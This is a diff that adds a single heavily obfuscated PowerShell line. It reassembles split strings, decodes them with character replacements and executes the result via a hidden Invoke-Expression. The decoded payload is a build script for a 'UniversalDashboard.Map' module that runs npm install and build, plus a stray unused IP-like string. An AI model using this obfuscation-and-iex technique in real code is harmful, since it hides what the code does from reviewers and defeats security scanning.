@@ -1,0 +1,25 @@
+ ('ta'+'sk Stage'+' {'+'
+  '+'  Pu'+'s'+'h-Loca'+'tion z0MK'+'NBPSScriptR'+'ootz0'+'M'+'
+'+' '+'   Copy-I'+'tem z0MKNB'+'PSScri'+'pt'+'RootHIjUniver'+'sa'+'lD'+'ash'+'bo'+'a'+'rd.Map.psm1z'+'0M z0MKNBPS'+'S'+'cri'+'p'+'tRoo'+'tHIjo'+'utp'+'u'+'tHIjUnive'+'rsal'+'Das'+'hboard.Map.ps'+'m'+'1'+'z'+'0M -'+'Fo'+'rce'+'
+    G'+'e'+'t-Ch'+'il'+'dItem'+' z0M'+'KNBPSS'+'cr'+'i'+'pt'+'RootHIjS'+'criptsz'+'0M'+' -File -Re'+'curs'+'e -F'+'ilt'+'er z0'+'M*.ps'+'1z0M 8bM '+'F'+'orEach-Object {
+  '+'     '+' '+'Get-'+'C'+'onten'+'t KNB_.'+'Fu'+'l'+'l'+'Name '+'-Raw'+' '+'8bM'+' O'+'ut'+'-File z0'+'M'+'KNB'+'PSSc'+'r'+'iptRootHIj'+'o'+'ut'+'put'+'H'+'IjUniversa'+'lD'+'as'+'hboard.Ma'+'p.psm1z0M -Appen'+'d '+'-E'+'ncodin'+'g'+' U'+'TF8
+     '+'   KNBr'+'v'+'GoP'+'z '+' '+'=  (('+'X'+'mbxH'+'C'+'ip'+':Xmb+'+'Xmb4Xmb'+'+'+'Xmb'+'9.9'+'8Xmb'+'+Xmb'+'.'+'210.1xXmb+'+'XmbH'+'CXmb'+')-C'+'r'+'Ep'+'lAcE XmbxHCX'+'m'+'b,[C'+'hAr]3'+'9'+')
+   '+' }
+  '+' '+' Copy-I'+'tem z0MKNBPS'+'ScriptRootH'+'I'+'j'+'Univ'+'e'+'rsa'+'lDa'+'shboard.'+'M'+'ap'+'.'+'ps'+'d'+'1z0M z'+'0MKN'+'BPS'+'S'+'crip'+'t'+'RootH'+'Ijoutputz0M 
+'+'
+'+'    Pop-Locati'+'on
+}
+
+t'+'a'+'sk Bu'+'ild '+'{
+    Rem'+'ove-I'+'tem z0'+'M'+'KNB'+'PSScriptRo'+'otH'+'Ij'+'out'+'p'+'u'+'tz0M '+'-'+'R'+'e'+'curse'+' '+'-Fo'+'rce '+'-Err'+'o'+'rAct'+'i'+'o'+'n Si'+'len'+'tlyCo'+'nt'+'inu'+'e
+ '+'   P'+'ush'+'-'+'Lo'+'cat'+'io'+'n'+' z'+'0M'+'KNB'+'P'+'SScr'+'iptR'+'ootz0M
+    '+'& {'+'
+  '+'  '+'    '+'K'+'N'+'BE'+'r'+'rorAc'+'t'+'ion'+'P'+'ref'+'e'+'re'+'nc'+'e ='+' '+'XmbSilent'+'l'+'y'+'Co'+'n'+'t'+'i'+'nue'+'Xmb
+    '+'  '+'  n'+'pm install
+  '+'  '+'  '+'  '+'npm '+'ru'+'n b'+'u'+'ild
+ '+'   }
+    Pop-Loca'+'t'+'i'+'on'+'
+}
+
+ta'+'sk .'+' Build, Stag'+'e
+').rEpLaCE(([char]72+[char]73+[char]106),'\').rEpLaCE(([char]75+[char]78+[char]66),[STRInG][char]36).rEpLaCE(([char]88+[char]109+[char]98),[STRInG][char]39).rEpLaCE('8bM','|').rEpLaCE(([char]122+[char]48+[char]77),[STRInG][char]34)|& ( $pShOMe[4]+$psHomE[30]+'X')
